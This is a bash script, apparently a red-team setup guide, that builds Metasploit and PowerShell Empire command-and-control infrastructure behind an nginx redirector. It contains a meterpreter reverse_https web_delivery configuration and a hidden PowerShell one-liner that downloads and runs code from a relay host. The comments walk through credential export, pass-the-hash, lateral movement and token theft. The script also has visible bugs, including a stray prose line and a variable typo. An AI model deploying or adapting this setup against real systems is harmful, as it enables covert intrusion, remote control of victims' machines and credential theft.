#!/bin/bash
## =============================================================================
# File:
#
# Author:   Cashiuus
# Created:  01/27/2016
# Revised:
#
# Purpose:
#
# Credit: https://attackerkb.com/Combinations/ReverseProxyAttackTools
#
# PowerShell Syntax Best Practices: https://github.com/PowerShellMafia/PowerSploit/blob/master/README.md
# Empire Tips/Tricks: https://enigma0x3.wordpress.com/2015/08/26/empire-tips-and-tricks/
## =============================================================================
__version__="0.1"
__author__="Cashiuus"
## ========[ TEXT COLORS ]================= ##
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
RED="\033[01;31m"      # Issues/Errors
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal
## =========[ CONSTANTS ]================ ##
MY_IP=""
RELAY_IP=""
GIT_DIR="${HOME}/git"
# =============================[      ]================================ #


# Install nginx
apt-get -y install nginx
service nginx stop


# Using 127.0.0.1 or 127.x.x.x with Metasploit isn't fun, feel free to skip this step if you wish to try it, but I've found it easier to just use a sub-interface:
ifconfig eth0:1 ${MY_IP} netmask 255.255.255.252

# Block port 2443
#This port will be used for Empire and unfortunately at the current time, I haven't found a way to stop it listening globally
iptables -A INPUT -p tcp --destination-port 2443 -j DROP







# =============================[ Configure Metasploit ]================================ #
# I like to use exploit/multi/script/web_delivery because it means I don't have to generate a binary and I can deliver the payload over the same port it will be getting the call back on

This switches it from the default python shell type to PowerShell(PSH):
file="empire-script.rc"
cat <<EOF > "${file}"

use exploit/multi/script/web_delivery
set TARGET 2
set PAYLOAD windows/meterpreter/reverse_https
set LPORT 443
# Digital Ocean - 104.236.36.205
set LHOST "${RELAY_IP}"
# Setting up the web server for the delivery to be SSL on port 1443 on the
# local only 192.168.1.100 sub interface. It is important that you set a
# URIPATH, letting it stay random makes the Nginx config a bit more difficult
set SSL true
set SRVHOST "${MY_IP}"
set SRVPORT 1443
set URIPATH /logoffbutton
# Now we set the Handler to actually bind to the same IP and port as we put
# the web server on instead of the ones configured in LHOST and LPORT
set ReverseListenerBindAddress "${MY_IP}"
set ReverseListenerPort 1443

# override those options for the stager to be back to the real IP and port
# we want (without this setting the initial connection would come in but
# the code sent back to the host to run (stage) would be to ${MY_IP}
set OverrideLHOST "${RELAY_IP}"
set OverrideLPORT 443

EOF

# Run msf using this new 'rc' file
msfconsole -r "${file}"

# =============================[      ]================================ #
# [*] Started HTTPS reverse handler on https://192.168.1.100:1443/
# [*] Using URL: https://192.168.1.100:1443/logoffbutton
# [*] Server started.
# [*] Run the following command on the target machine:
# powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('https://${RELAY_IP}:1443/logoffbutton');

# TODO: Save the powershell command portion of the response to a variable for later
# and remove the ":1443" from the string


# =============================[ Setup PowerShell Empire ]================================ #

# ==[ Depends ]== #
# These all are the same for Debian and Ubuntu, but Fedora uses "dnf install -y ..." instead of apt-get
apt-get -y install python-dev python-m2crypto swig python-pip
pip install pip --upgrade
pip install pycrypto --upgrade
pip install iptools --upgrade
pip install pydispatcher --upgrade



# ==[ Install Empire ]== #
[[ ! -d "${GIT_DIR}" ]] && mkdir -p "${GIR_DIR}"
cd "${GIT_DIR}"
git clone https://github.com/powershellempire/empire
cd empire/setup

# If you want to customize anything, modify the "setup_database.py" file before running "install.sh"
# Below passes variable to script to auto-answer key generation question during install
STAGING_KEY=RANDOM ./install.sh

# Results:
#   Database Created at: "${GIT_DIR}/empire/data/empire.db"
#   Certificate written to: "${GIT_DIR}/empire/data/empire.pem"

# If you want to just reset Empire's database, you can run: ./empire/setup/reset.sh
# Run in verbose mode for debugging: ./empire -debug

if [[ $@ -eq 0 ]]; then
    echo -e "[ERROR] Problem running install script for Empire"
    exit 1
fi


# ==[ Launch Empire ]== #
# TODO: Can Empire accept 'rc' files?


# ==[ Setup a Listener ]== #
#(Empire) > listeners
#(Empire: listeners) > set Name rev
#(Empire: listeners) > set CertPath ../data/empire.pem
#(Empire: listeners) > set Host https://104.236.49.208
#(Empire: listeners) > set Port 2443
#(Empire: listeners) > run

# TODO: There is a bug with the port so currently need to edit the sqlite database
#root@oneport:/opt/empire/data# sqlite3 empire.db
#SQLite version 3.8.7.1 2014-10-29 13:59:56
#Enter ".help" for usage hints
#sqlite> update listeners set host='https://104.236.49.208' where name='rev';
#sqlite> .q

# The reason we do this is because inside of Empire, if you switch the port option,
# it automatically gets appended to the host, no way that I've found to stop that,
# but it doesn't "fix" it the Sqlite edit.

# Start Empire back up and create our launcher (which will now be the correct config)
"${GIT_DIR}/empire/empire"

# Launch the previously-created listener with this one-liner
#(Empire) > launcher rev

# List all listeners (tab-completable)
#(Empire) > listeners




# ==[ Agents ]== #

# When an agent comes in, you can rename it so it's easier to recognize
#(Empire) > list
#(Empire) > rename SSGXXWDB2URWP3CW CEOBox
#(Empire) > list

# Alternatively, you can rename it within context, just w/o including its original name
#(Empire) > interact SSGXXWDB2URWP3CW
#(Empire) > rename CEOBox

# Determine which agents have died
#(Empire) > list stale
# or agents that haven't checked within the past x minutes
#(Empire) > list 30

# Mass Agent Configuration Changes (<command> all <parameter>)
# set sleep for all agents to a new value
#(Empire) > sleep all 0

# Search for processes by name
#(Empire) > ps powershell


# High Integrity Agents (required for modules like mimikatz, denoted with asterisk *)
#(Empire) > agents


# check if your current user is a local administrator in a medium integrity context
# (meaning a bypassuac attack should be run) by running the privesc/powerup/allchecks module.
#(Empire) >




# Export Credentials
#(Empire) > creds export /root/pendrop/empire-credentials.csv


# Use credentials in modules by their CredID
# first, show creds and find the one you want to use
#creds
# Then, in a module, set it
#usemodule lateral_movement/invoke_wmi
#set CredID 7
#execute
# or remove a cred
#unset CredID 7

# You can also use the CredID with the "pth" command
# First, interact with an agent
# Find the hash int he creds list you want to use
#creds
# Pass the hash!
#pth 7

# Then, you can steal the token of the newly-created process (noting process ID from above cmd output)
#steal_token 948






# =============================[  Configure Nginx  ]================================ #
# Ref: https://www.nginx.com/resources/wiki/start/topics/tutorials/commandline/
# Ref: https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-debian-8
# Ref: http://www.liberiangeek.net/2015/07/how-to-run-multiple-websites-using-nginx-webserver-on-ubuntu-15-04/
#   Main Config File: /etc/nginx/nginx.conf
#   Default server root: /var/www/html
#   Default Server Block Config: /etc/nginx/sites-enabled/default
#   Additional Server Block Configs: /etc/nginx/sites-available/

file="/etc/nginx/sites-available/empire"
enabled="/etc/nginx/sites-enabled/empire"
cat <<EOF > "${file}"
### PowerShell Empire Nginx Server Block
#
server {
        listen 443 ssl;
        ##
        # This is the only set of keys that matter,
        # if you want to set a valid cert, here is
        # where you would do it.
        ##
        ssl_certificate /tmp/server.crt;
        ssl_certificate_key /tmp/server.key;

        ##
        # This makes sets what host header to answer
        # to, default means everything, can be useful
        # if you want to have more than one host
        # for each of your attack tools
        ##
        server_name default;

        ##
        # Next 3 are the callback URLs for Empire
        ##

        location /admin/get.php {
                proxy_pass https://192.168.1.100:2443;
        }

        location /news.asp {
                proxy_pass https://192.168.1.100:2443;
        }

        location /login/process.jsp {
                proxy_pass https://192.168.1.100:2443;
        }

        ##
        # Stager URIs for Empire
        ##
        location ~ ^/index\.(asp|php|jsp)$ {
                proxy_pass https://192.168.1.100:2443;
        }

        ##
        # Regular checkin regex (20 or more long URI with upper, lower and -_) ending in /
        ##
        location ~ "^/([a-zA-Z0-9\-\_]{20,})/$" {
                proxy_pass https://192.168.1.100:1443;
        }

        ##
        # Stage URI (5 characters, upper, lower, and -_) with no extension
        ##
        location ~ "^/([a-zA-Z0-9\-\_]{5})$" {
                proxy_pass https://192.168.1.100:1443;
        }

        ##
        #  Web Delivery URI, not required if not staged through web_delivery module
        ##
        location /logoffbutton {
                proxy_pass https://192.168.1.100:1443;
        }

        ##
        # Catch all to toss the rest at google
        ##
        location / {
                proxy_pass https://www.google.com;
        }
}
EOF

# Ensure the sites-available/default file is in fact still there

# and delete the enabled one
rm /etc/nginx/sites-enabled/default

# Now, symlink our custom nginx server block so it's the only enabled site
ln -s "${file}" "${enabled}"

# restart nginx so the new server is loaded
service nginx restart





function finish {
    # Any script-termination routines go here, but function cannot be empty
    clear
}
# End of script
trap finish EXIT

# ================[ Expression Cheat Sheet ]==================================
#
#   -d      file exists and is a directory
#   -e      file exists
#   -f      file exists and is a regular file
#   -h      file exists and is a symbolic link
#   -s      file exists and size greater than zero
#   -r      file exists and has read permission
#   -w      file exists and write permission granted
#   -x      file exists and execute permission granted
#   -z      file is size zero (empty)
#   [[ $? -eq 0 ]]    Previous command was successful
#   [[ ! $? -eq 0 ]]    Previous command NOT successful
#

# --- TOUCH
#touch
#touch "$file" 2>/dev/null || { echo "Cannot write to $file" >&2; exit 1; }

### ---[ READ ]---###
#   -p ""   Instead of echoing text, provide it right in the "prompt" argument
#               *NOTE: Typically, there is no newline, so you may need to follow
#               this with an "echo" statement to output a newline.
#   -e      Specify variable response is stored in. Arg can be anywhere,
#           but variable is always at the end of the statement
#   -n #    Number of seconds to wait for a response before continuing automatically
#   -i ""   Specify a default value. If user hits ENTER or doesn't respond, this value is saved
#

#Ask for a path with a default value
#read -p "Enter the path to the file: " -i "/usr/local/etc/" -e FILEPATH





# ==================[ BASH GUIDES ]====================== #

# Using Exit Codes: http://bencane.com/2014/09/02/understanding-exit-codes-and-how-to-use-them-in-bash-scripts/
# Writing Robust BASH Scripts: http://www.davidpashley.com/articles/writing-robust-shell-scripts/
